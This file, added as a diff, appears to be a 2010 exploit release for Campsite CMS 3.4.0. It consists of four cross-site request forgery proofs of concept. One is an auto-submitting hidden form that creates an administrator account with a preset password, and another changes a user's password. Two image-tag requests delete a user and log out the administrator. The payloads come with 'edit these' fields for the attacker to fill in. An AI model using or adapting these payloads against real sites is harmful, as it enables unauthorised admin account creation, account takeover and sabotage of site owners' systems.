@@ -1,0 +1,81 @@
+<!---
+    Title: Campsite CMS 3.4.0 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Mon 12 Jul 2010 03:40:46 PM EEST
+    Vendor: http://www.sourcefabric.org/en/home/web/6/Campsite.htm?tpl=18
+    Download: http://sourceforge.net/projects/campsite/files/campsite/3.4.0/campsite-3.4.0.tar.gz/download
+--->
+
+-=[ CSRF PoC 1 - Create Admin User ]=-
+
+    <html>
+        <head>
+            <title>Campsite CMS 3.4.0 Multiple CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/admin/users/do_add.php" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="UName" value="root" />
+                <input type="hidden" name="EMail" value="root@root.com" />
+                <input type="hidden" name="Name" value="root" />
+                <input type="hidden" name="password" value="rootroot" />
+                <input type="hidden" name="passwordConf" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="Type" value="1" />
+                <input type="hidden" name="Title" value="Mr." />
+                <input type="hidden" name="Age" value="0-17" />
+                <input type="hidden" name="Phone" value="" />
+                <input type="hidden" name="Phone2" value="1" />
+                <input type="hidden" name="City" value="" />
+                <input type="hidden" name="PostalCode" value="" />
+                <input type="hidden" name="CountryCode" value="AD" />
+                <input type="hidden" name="State" value="" />
+                <input type="hidden" name="Fax" value="" />
+                <input type="hidden" name="Contact" value="" />
+                <input type="hidden" name="Employer" value="" />
+                <input type="hidden" name="Position" value="" />
+                <input type="hidden" name="StrAddress" value="" />
+                <input type="hidden" name="uType" value="Staff" />
+                <input type="hidden" name="Save" value="Save" />
+                <input type="hidden" name="passwordTxt" value="" />
+                <input type="hidden" name="EmployerType" value="Other" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Change User Password ]=-
+
+    <html>
+        <head>
+            <title>Campsite CMS 3.4.0 Multiple CSRF Vulnerabilities - Change User Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/admin/users/do_edit.php" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="Name" value="root" />
+                <input type="hidden" name="EMail" value="root@root.com" />
+                <input type="hidden" name="password" value="rootroot" />
+                <input type="hidden" name="passwordConf" value="rootroot" />
+                <!--- User id --->
+                <input type="hidden" name="User" value="2" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="uType" value="Staff" />
+                <input type="hidden" name="setPassword" value="true" />
+                <input type="hidden" name="customizeRights" value="false" />
+                <input type="hidden" name="Save" value="Save" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 3 - Delete User ]=-
+
+    <img src="http://[domain]/admin/users/do_del.php?User=2&uType=Staff" alt="Do you see this?" />
+
+-=[ CSRF PoC 4 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/admin/logout.php" alt="Do you see this?" />
+ 
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
